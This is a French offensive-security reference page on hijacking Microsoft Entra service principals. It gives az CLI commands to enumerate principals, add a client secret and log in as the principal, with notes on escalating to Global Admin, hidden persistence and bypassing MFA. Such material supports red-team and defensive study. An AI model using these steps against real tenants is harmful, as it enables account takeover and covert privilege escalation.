---
title: "Principaux de service : détourner les identités d'application"
order: 1
description: "Abus des principaux de service Entra : énumération et détournement des identités d'application, ajout d'identifiants et utilisation de rôles d'application fortement privilégiés comme point d'appui de persistance et d'élévation de privilèges."
keywords:
  - principal de service
  - identité d'application
  - persistance
  - rôles d'application
  - application d'entreprise
---

# Principaux de service

Un principal de service est l'instance d'une application dans le locataire, avec ses propres identifiants et autorisations accordées. Beaucoup détiennent de puissants rôles d'application Microsoft Graph que surveille aucun utilisateur interactif ; en détourner un, en ajoutant des identifiants ou en utilisant ses octrois existants, constitue à la fois une élévation de privilèges et une persistance discrète.

## Énumérer et détourner

```bash
# enumerate SPs and their app-role grants
az ad sp list --all --query "[].{name:displayName,id:id,appId:appId}" -o table
az ad sp show --id <sp> --query "appRoles"

# add a client secret to a service principal you can write to, then log in as it
az ad sp credential reset --id <appId>
az login --service-principal -u <appId> -p <secret> --tenant <tenant>
```

## Notes d'exploitation

- Un principal de service disposant de `RoleManagement.ReadWrite.Directory` ou `AppRoleAssignment.ReadWrite.All` peut s'accorder, à lui-même ou à vous, davantage de droits : un chemin vers Global Admin ([autorisations d'API](api-permissions.md)).
- Les identifiants ajoutés à un principal de service constituent une persistance durable, qui survit aux réinitialisations de mots de passe des utilisateurs et passe facilement inaperçue.
- Les principaux de service sont exemptés de la plupart des politiques d'accès conditionnel visant les utilisateurs, de sorte qu'un identifiant de principal de service contourne souvent entièrement le MFA.

## Outils

- **az cli** (`az ad sp`) : énumérer et ajouter des identifiants.
- **ROADtools** (`roadrecon`) : graphe des principaux de service et des autorisations.
- **BARK** / **AzureHound** : analyse des chemins d'attaque des applications.

## Références

- [SpecterOps : BARK](https://github.com/BloodHoundAD/BARK)
- [ROADtools](https://github.com/dirkjanm/ROADtools)
- [HackTricks Cloud : principaux de service](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
